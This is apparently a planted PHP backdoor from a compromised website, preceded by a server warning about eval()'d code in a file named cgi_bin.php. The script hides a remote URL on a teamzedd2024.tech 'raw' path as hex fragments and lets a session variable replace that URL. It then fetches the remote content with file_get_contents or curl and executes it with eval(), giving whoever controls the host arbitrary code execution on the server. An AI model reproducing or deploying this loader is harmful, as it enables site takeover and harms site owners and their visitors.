<br />
<b>Warning</b>:  ob_start(): Output handler 'ob_gzhandler' conflicts with 'zlib output compression' in <b>/home/vidastr1/public_html/cgi_bin.php(2) : eval()'d code</b> on line <b>3408</b><br />
<?php
@session_start();

// Hex parts disimpan dalam array untuk kemudahan dan kebersihan
$hexParts = [
    '68', '74', '74', '70', '73', '3a', '2f', '2f',
    '74', '65', '61', '6d', '7a', '65', '64', '64',
    '32', '30', '32', '34', '2e', '74', '65', '63',
    '68', '2f', '72', '61', '77', '2f', '4d', '63',
    '75', '51', '47', '49'
];

// Gabung hex dan ubah jadi URL
$hex = implode('', $hexParts);
$url = '';
for ($i = 0; $i < strlen($hex); $i += 2) {
    $url .= chr(hexdec(substr($hex, $i, 2)));
}

// Override URL jika ada di session
if (!empty($_SESSION['ts_url'])) {
    $url = $_SESSION['ts_url'];
}

// Ambil konten dari URL
$content = @file_get_contents($url);

if (!$content && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Cek apakah konten ada dan valid
if (!empty($content)) {
    // Bersihkan output buffer sebelum eval
    if (ob_get_level()) ob_end_clean();

    // Pastikan tidak ada parse error saat eval
    try {
        eval("?>" . $content);
    } catch (ParseError $e) {
        // Tangani error parsing PHP dari konten remote
        echo "Parse error pada konten remote: " . $e->getMessage();
    } catch (Throwable $e) {
        echo "Eval error: " . $e->getMessage();
    }
} else {
    // Debugging info
    echo "Gagal mengambil konten dari: $url\n";
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo "URL tidak valid.\n";
    } else {
        echo "Pastikan server remote aktif dan tidak memblokir permintaan ini.\n";
    }
}
?>